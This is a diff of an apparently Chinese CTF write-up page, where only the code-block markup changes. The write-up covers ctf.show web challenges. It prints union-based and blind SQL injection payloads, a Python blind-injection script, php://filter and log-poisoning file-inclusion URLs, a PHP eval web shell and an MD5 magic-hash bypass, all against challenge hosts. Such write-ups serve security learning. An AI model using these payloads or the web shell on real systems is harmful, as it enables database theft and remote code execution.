@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    7.7k
+                    7.4k
                 </div>
                 
 
@@ -642,10 +642,9 @@ alt="image-20230213080908941" /></h4>
 <li><p>地址栏是<code>get</code>传参</p></li>
 <li><p>sql注入post传参</p></li>
 <li><p>成功sql注入，可以回显</p>
-<div class="sourceCode" id="cb1"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>username=admin&#39; or 1=1 order by 4# <span class="er">&amp;</span>password=123456</span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>username=admin&#39; or 1=1 order by 3# <span class="er">&amp;</span>password=123456</span></code></pre></div></li>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">username=admin' or 1=1 order by 4# &amp;password=123456
+
+username=admin' or 1=1 order by 3# &amp;password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 <li><p>select 个数<img
 src="https://s2.loli.net/2023/02/13/ZyDW28pbmilUJIS.png"
 alt="image-20230213161043948" /><img
@@ -655,54 +654,49 @@ alt="image-20230213161014100" /></p></li>
 src="https://s2.loli.net/2023/02/13/9ju4Mf7DtA3Tqk8.png"
 alt="image-20230213160026269" /></p></li>
 <li><p>爆数据库</p>
-<div class="sourceCode" id="cb2"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>username<span class="op">=</span>admin<span class="st">&#39; or 1=1 union select 1,group_concat(schema_name),3 from information_schema.schemata # &amp;password=123456</span></span>
-<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a> <span class="st">&quot;union&quot;</span><span class="op">:</span> 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。</span>
-<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;select&quot;</span><span class="op">:</span> 这是SQL语言中的一个关键字，表示从数据库中选择数据。</span>
-<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;1&quot;</span><span class="op">:</span> 这是一个常量值，代表一个整数。</span>
-<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;group_concat&quot;</span><span class="op">:</span> 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。</span>
-<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;schema_name&quot;</span><span class="op">:</span> 这是<span class="st">&quot;information_schema.schemata&quot;</span>表中的一列，代表数据库名称。</span>
-<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;information_schema.schemata&quot;</span><span class="op">:</span> 这是MySQL数据库中的一个系统数据库表，包含数据库信息。</span>
-<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;3&quot;</span><span class="op">:</span> 这是一个常量值，代表一个整数</span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token comment"># &amp;password=123456</span>
+
+ <span class="token string">"union"</span>: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。
+
+<span class="token string">"select"</span>: 这是SQL语言中的一个关键字，表示从数据库中选择数据。
+
+<span class="token string">"1"</span>: 这是一个常量值，代表一个整数。
+
+<span class="token string">"group_concat"</span>: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。
+
+<span class="token string">"schema_name"</span>: 这是<span class="token string">"information_schema.schemata"</span>表中的一列，代表数据库名称。
+
+<span class="token string">"information_schema.schemata"</span>: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。
+
+<span class="token string">"3"</span>: 这是一个常量值，代表一个整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/b65mzrB2wUW9MHc.png"
 alt="image-20230213181032739" />
 <figcaption aria-hidden="true">image-20230213181032739</figcaption>
 </figure></li>
 <li><p>爆表</p>
-<div class="sourceCode" id="cb3"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>username<span class="op">=</span>admin<span class="st">&#39; or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables # &amp;password=123456</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token comment"># &amp;password=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/RvZwiqalHCVrX3D.png"
 alt="image-20230213181732271" />
 <figcaption aria-hidden="true">image-20230213181732271</figcaption>
 </figure></li>
 <li><p>指定数据库的爆表</p>
-<div class="sourceCode" id="cb4"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>username<span class="op">=</span>admin<span class="st">&#39; or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot; # &amp;password=123456</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema=<span class="token string">"web2"</span> <span class="token comment"># &amp;password=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/nFGV8KBTd71gPx5.png"
 alt="image-20230213182835819" />
 <figcaption aria-hidden="true">image-20230213182835819</figcaption>
 </figure></li>
 <li><p>爆列</p>
-<div class="sourceCode" id="cb5"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>username<span class="op">=</span>admin<span class="st">&#39; or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#39;</span>flag<span class="st">&#39; and table_schema=&#39;</span>web2<span class="st">&#39;  # &amp;password=123456</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">username=admin<span class="token string">' or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name ='</span>flag<span class="token string">' and table_schema='</span>web2'  <span class="token comment"># &amp;password=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/FpKWRagnsd3wZtQ.png"
 alt="image-20230213184817127" />
 <figcaption aria-hidden="true">image-20230213184817127</figcaption>
 </figure></li>
 <li><p>flag</p>
-<div class="sourceCode" id="cb6"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>username<span class="op">=</span>admin<span class="st">&#39; or 1=1 union select 1,flag,3 from flag # &amp;password=123456</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>3 <span class="token keyword">from</span> flag <span class="token comment"># &amp;password=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/xk7rV4TYGHUoNLf.png"
 alt="image-20230213185026341" />
@@ -738,8 +732,7 @@ alt="image-20230213221624031" /></p></li>
 <ul>
 <li>编码后的文件内容不会被执行,而是展示在页面中</li>
 </ul>
-<div class="sourceCode" id="cb7"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>http<span class="op">://</span>19fd689a<span class="op">-</span>f81b<span class="op">-</span>4418<span class="op">-</span>8ea2<span class="op">-</span>ddc142465b1c<span class="op">.</span><span class="fu">challenge</span><span class="op">.</span><span class="fu">ctf</span><span class="op">.</span><span class="fu">show</span><span class="op">/?</span>url<span class="op">=</span>php<span class="op">://</span><span class="kw">filter</span><span class="op">/</span>read<span class="op">=</span>convert<span class="op">.</span><span class="fu">base64</span><span class="op">-</span>encode<span class="op">/</span>resource<span class="op">=</span>index<span class="op">.</span><span class="fu">php</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">http:<span class="token operator">/</span><span class="token operator">/</span>19fd689a-f81b-4418-8ea2-ddc142465b1c<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?url=php:<span class="token operator">/</span><span class="token operator">/</span><span class="token keyword">filter</span><span class="token operator">/</span>read=convert<span class="token punctuation">.</span>base64-encode/resource=index<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/WbtGQMyipwcDfqs.png"
 alt="image-20230213223316936" />
@@ -772,8 +765,7 @@ src="https://s2.loli.net/2023/02/13/e2sUuNjaX6FyMtq.png"
 alt="image-20230213232507475" /></p></li>
 <li><p>一句话木马</p></li>
 </ul>
-<div class="sourceCode" id="cb8"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="pp">@</span><span class="kw">eval</span>(<span class="va">$_POST</span>[<span class="st">&#39;a&#39;</span>])<span class="ot">;</span><span class="kw">?&gt;</span></span></code></pre></div>
+<p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <ul>
 <li><p>antSword安装<img
 src="https://s2.loli.net/2023/02/13/VdpsDgC98tbNi5F.png"
@@ -785,9 +777,8 @@ alt="image-20230214002045185" />
 <figcaption aria-hidden="true">image-20230214002045185</figcaption>
 </figure></li>
 <li><p>蚁剑连接</p>
-<div class="sourceCode" id="cb9"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>URL地址：</span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>http<span class="op">://</span>c3520b57<span class="op">-</span>6be4<span class="op">-</span>4a9d<span class="op">-</span>87c9<span class="op">-</span>b97780c4dc9f<span class="op">.</span><span class="fu">challenge</span><span class="op">.</span><span class="fu">ctf</span><span class="op">.</span><span class="fu">show</span><span class="op">/?</span>url<span class="op">=/</span><span class="kw">var</span><span class="op">/</span>log<span class="op">/</span>nginx<span class="op">/</span>access<span class="op">.</span><span class="fu">log</span></span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">URL地址：
+http:<span class="token operator">/</span><span class="token operator">/</span>c3520b57-6be4-4a9d-87c9-b97780c4dc9f<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?url=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/nginx/access<span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/14/OvR4Pu3infYBFMG.png"
 alt="image-20230214002211635" />
@@ -805,24 +796,22 @@ src="https://s2.loli.net/2023/02/24/D4cHsIlnwoBGeSr.png"
 alt="image-20230224013307979" /></h4>
 <ul>
 <li><p>代码解释</p>
-<div class="sourceCode" id="cb10"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span>：这是 <span class="cn">PHP</span> 代码的起始标记，它告诉 <span class="cn">PHP</span> 解释器该文件包含 <span class="cn">PHP</span> 代码。</span>
-<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a> <span class="va">$flag</span><span class="op">=</span><span class="st">&quot;&quot;</span>：这创建了一个名为 <span class="va">$flag</span> 的变量，并将其初始值设置为空字符串。</span>
-<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a> <span class="va">$v1</span><span class="op">=</span><span class="va">$_GET</span>[<span class="st">&#39;v1&#39;</span>]：这将 <span class="cn">GET</span> 请求中的 v1 参数的值赋给变量 <span class="va">$v1</span>。</span>
-<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a> <span class="va">$v2</span><span class="op">=</span><span class="va">$_GET</span>[<span class="st">&#39;v2&#39;</span>]：这将 <span class="cn">GET</span> 请求中的 v2 参数的值赋给变量 <span class="va">$v2</span>。</span>
-<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$v1</span>) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$v2</span>))&#123;&#125;：这个条件语句检查变量 <span class="va">$v1</span> 和 <span class="va">$v2</span> 是否都已经设置，如果是则执行条件语句块中的代码。</span>
-<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="op">!</span><span class="fu">ctype_alpha</span>(<span class="va">$v1</span>))：这个条件语句检查 <span class="va">$v1</span> 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 <span class="st">&quot;v1 error&quot;</span> 并终止脚本的执行。</span>
-<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="op">!</span><span class="fu">is_numeric</span>(<span class="va">$v2</span>))：这个条件语句检查 <span class="va">$v2</span> 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 <span class="st">&quot;v2 error&quot;</span> 并终止脚本的执行。</span>
-<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="fu">md5</span>(<span class="va">$v1</span>)<span class="op">==</span><span class="fu">md5</span>(<span class="va">$v2</span>))：这个条件语句检查 <span class="va">$v1</span> 和 <span class="va">$v2</span> 的 <span class="fu">md5</span> 哈希值是否相同，如果是，执行条件语句块中的代码，输出 <span class="va">$flag</span> 变量的值。</span>
-<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a> <span class="kw">echo</span> <span class="va">$flag</span><span class="ot">;</span>：这个语句将 <span class="va">$flag</span> 变量的值输出到客户端。</span>
-<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a> &#125;<span class="cf">else</span>&#123;&#125;：如果 <span class="cf">if</span> 语句中的条件没有被满足，执行这个 <span class="cf">else</span> 语句块中的代码。</span>
-<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a> <span class="kw">echo</span> <span class="st">&quot;where is flag?&quot;</span><span class="ot">;</span>：这个语句输出 <span class="st">&quot;where is flag?&quot;</span>，表示在缺少 <span class="cn">GET</span> 请求参数的情况下无法找到 flag 值。</span>
-<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a> <span class="kw">?&gt;</span>：这是 <span class="cn">PHP</span> 代码的结束标记，告诉 <span class="cn">PHP</span> 解释器该文件的 <span class="cn">PHP</span> 代码部分已经结束。</span></code></pre></div></li>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php：这是 <span class="token constant">PHP</span> 代码的起始标记，它告诉 <span class="token constant">PHP</span> 解释器该文件包含 <span class="token constant">PHP</span> 代码。
+ <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span>：这创建了一个名为 <span class="token variable">$flag</span> 的变量，并将其初始值设置为空字符串。
+ <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span>：这将 <span class="token constant">GET</span> 请求中的 v1 参数的值赋给变量 <span class="token variable">$v1</span>。
+ <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span>：这将 <span class="token constant">GET</span> 请求中的 v2 参数的值赋给变量 <span class="token variable">$v2</span>。
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>：这个条件语句检查变量 <span class="token variable">$v1</span> 和 <span class="token variable">$v2</span> 是否都已经设置，如果是则执行条件语句块中的代码。
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v1</span> 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 <span class="token string double-quoted-string">"v1 error"</span> 并终止脚本的执行。
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v2</span> 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 <span class="token string double-quoted-string">"v2 error"</span> 并终止脚本的执行。
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v1</span> 和 <span class="token variable">$v2</span> 的 md5 哈希值是否相同，如果是，执行条件语句块中的代码，输出 <span class="token variable">$flag</span> 变量的值。
+ <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>：这个语句将 <span class="token variable">$flag</span> 变量的值输出到客户端。
+ <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>：如果 <span class="token keyword">if</span> 语句中的条件没有被满足，执行这个 <span class="token keyword">else</span> 语句块中的代码。
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>：这个语句输出 <span class="token string double-quoted-string">"where is flag?"</span>，表示在缺少 <span class="token constant">GET</span> 请求参数的情况下无法找到 flag 值。
+ <span class="token delimiter important">?></span></span>：这是 PHP 代码的结束标记，告诉 PHP 解释器该文件的 PHP 代码部分已经结束。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>answer</p></li>
 </ul>
-<div class="sourceCode" id="cb11"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>http<span class="op">://</span>e0e32665<span class="op">-</span>ecd3<span class="op">-</span>4333<span class="op">-</span>b7b4<span class="op">-</span>0d6c57e14d57<span class="op">.</span><span class="fu">challenge</span><span class="op">.</span><span class="fu">ctf</span><span class="op">.</span><span class="fu">show</span><span class="op">/?</span></span>
-<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>v1<span class="op">=</span>QNKCDZO<span class="op">&amp;</span>v2<span class="op">=</span>240610708</span></code></pre></div>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">http:<span class="token operator">/</span><span class="token operator">/</span>e0e32665-ecd3-4333-b7b4-0d6c57e14d57<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?
+v1=QNKCDZO&amp;v2=240610708<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/02/24/45hF9dq87cpfzDV.png"
 alt="image-20230224021331961" />
@@ -886,78 +875,76 @@ alt="image-20230225111446970" /></p></li>
 <li><p>点开一篇文章 观察地址栏 有参数id</p>
 <ul>
 <li><p>payload</p>
-<div class="sourceCode" id="cb12"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>id<span class="op">=</span>1<span class="op">||</span>1</span></code></pre></div></li>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">id=1<span class="token punctuation">|</span><span class="token punctuation">|</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>会显示所有文章：可sql注入</p></li>
 </ul></li>
 <li><p>接下来就是常规操作</p>
 <ul>
 <li><p>爆库，爆表，爆裂</p></li>
 <li><p>脚本</p>
-<div class="sourceCode" id="cb13"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>s<span class="op">=</span>requests.session()</span>
-<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>url<span class="op">=</span><span class="st">&#39;http://376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show/index.php&#39;</span></span>
-<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>table<span class="op">=</span><span class="st">&quot;&quot;</span></span>
-<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>,<span class="dv">45</span>):</span>
-<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(i)</span>
-<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">31</span>,<span class="dv">128</span>):</span>
-<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>        <span class="co">#爆表名  flag</span></span>
-<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">=</span> <span class="st">&quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/</span><span class="sc">%s</span><span class="st">/**/for/**/1))=</span><span class="sc">%s</span><span class="st">#&quot;</span><span class="op">%</span>(<span class="bu">str</span>(i),<span class="bu">str</span>(j))</span>
-<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>        <span class="co">#爆字段名 flag</span></span>
-<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span>
-<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">#读取flag</span></span>
-<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>        <span class="co">#payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span></span>
-<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>        ra <span class="op">=</span> s.get(url<span class="op">=</span>url <span class="op">+</span> <span class="st">&#39;?id=0/**/or/**/&#39;</span> <span class="op">+</span> payload).text</span>
-<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">&#39;I asked nothing&#39;</span> <span class="kw">in</span> ra:</span>
-<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a>            table <span class="op">+=</span> <span class="bu">chr</span>(j)</span>
-<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(table)</span>
-<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span></code></pre></div></li>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span><span class="token string">'http://376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show/index.php'</span>
+table<span class="token operator">=</span><span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment">#爆表名  flag</span>
+        payload <span class="token operator">=</span> <span class="token string">"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment">#爆字段名 flag</span>
+        <span class="token comment">#payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>
+        <span class="token comment">#读取flag</span>
+        <span class="token comment">#payload = "ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"%(str(i), str(j))</span>
+        ra <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">'?id=0/**/or/**/'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> ra<span class="token punctuation">:</span>
+            table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>运行情况<img
 src="https://s2.loli.net/2023/02/26/5aFurQvdiW6fpO3.png"
 alt="image-20230226235929980" /></p></li>
 </ul></li>
 <li><p>换个脚本</p>
-<div class="sourceCode" id="cb14"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&quot;http://124.156.121.112:28069/?id=-1&#39;/**/&quot;</span></span>
-<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a></span>
